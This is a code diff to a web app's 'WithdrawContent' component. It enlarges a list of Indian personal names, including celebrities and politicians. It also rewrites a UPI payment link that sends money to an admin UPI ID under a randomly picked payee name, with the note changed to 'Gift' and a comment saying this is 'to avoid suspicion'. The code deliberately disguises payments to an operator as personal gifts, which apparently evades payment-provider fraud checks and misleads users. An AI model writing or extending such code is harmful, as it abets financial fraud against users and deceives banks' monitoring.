@@ -19,7 +19,15 @@ const PERSONAL_NAMES = [
     "Manoj Yadav", "Vikram Singh", "Sandeep Mishra", "Deepak Verma", "Amit Sharma",
     "Sumit Pathak", "Neeraj Pandey", "Pankaj Tiwari", "Vijay Pratap", "Rajesh Khanna",
     "Sunil Grover", "Anil Saxena", "Suresh Prabhu", "Rohit Mehra", "Yash Pal",
-    "Karan Johar", "Arjun Kapoor", "Sanjay Dutt", "Harish Rawat", "Prashant Bhushan"
+    "Karan Johar", "Arjun Kapoor", "Sanjay Dutt", "Harish Rawat", "Prashant Bhushan",
+    "Alok Nath", "Ritesh Deshmukh", "Varun Dhawan", "Ishaan Khattar", "Piyush Goyal",
+    "Nitin Gadkari", "Yogesh Meena", "Manish Sisodia", "Siddharth Malhotra",
+    "Vicky Kaushal", "Ranbir Kapoor", "Kartik Aaryan", "Ayushmann Khurrana",
+    "Amit Singh", "Rajesh Kumar", "Sanjay Verma", "Sunil Yadav", "Vijay Sharma", 
+    "Anil Gupta", "Pankaj Mishra", "Deepak Lodhi", "Sandeep Saini", "Manoj Pandey", 
+    "Vikram Rathore", "Ajay Meena", "Rahul Chauhan", "Vivek Maurya", "Aditya Dixit", 
+    "Ravi Solanki", "Sumit Rawat", "Neeraj Tiwari", "Surendra Pal", "Dharmendra Singh", 
+    "Jitendra Kumar", "Mahendra Prasad", "Rakesh Sharma", "Mohit Suri", "Rohit Shetty"
 ];
 
 function WithdrawContent() {
@@ -81,8 +89,8 @@ function WithdrawContent() {
 
         setIsLoading(true);
 
-        // Professional but personal feeling intent
-        const upiLink = `upi://pay?pa=${ADMIN_UPI_ID}&pn=${encodeURIComponent(randomName)}&am=${amount}&cu=INR&tn=Personal`;
+        // Simple personal note to avoid suspicion
+        const upiLink = `upi://pay?pa=${ADMIN_UPI_ID}&pn=${encodeURIComponent(randomName)}&am=${amount}&cu=INR&tn=Gift`;
         
         window.location.href = upiLink;
         
